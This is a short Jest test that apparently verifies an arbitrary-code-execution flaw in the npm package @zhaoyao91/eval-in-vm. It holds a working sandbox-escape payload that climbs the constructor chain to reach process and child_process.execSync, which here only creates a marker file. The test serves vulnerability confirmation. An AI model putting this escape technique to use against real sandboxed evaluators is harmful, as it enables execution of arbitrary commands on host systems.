test("Arbitrary code execution in @zhaoyao91/eval-in-vm", () => {
  expect.assertions(2);
  const fs = require("fs");
  const path = "./zhaoyao91";

  try {
      fs.unlinkSync(path, function (err) {});
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  const eval1 = require("@zhaoyao91/eval-in-vm");
  try {
    ("use strict");
    const result = eval1(`1 + (import("test").catch((e)=>{})["constructor"]["constructor"]("return process")().mainModule.require("child_process").execSync("touch ${path}"));`);
  } catch (error) {console.log(error)}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
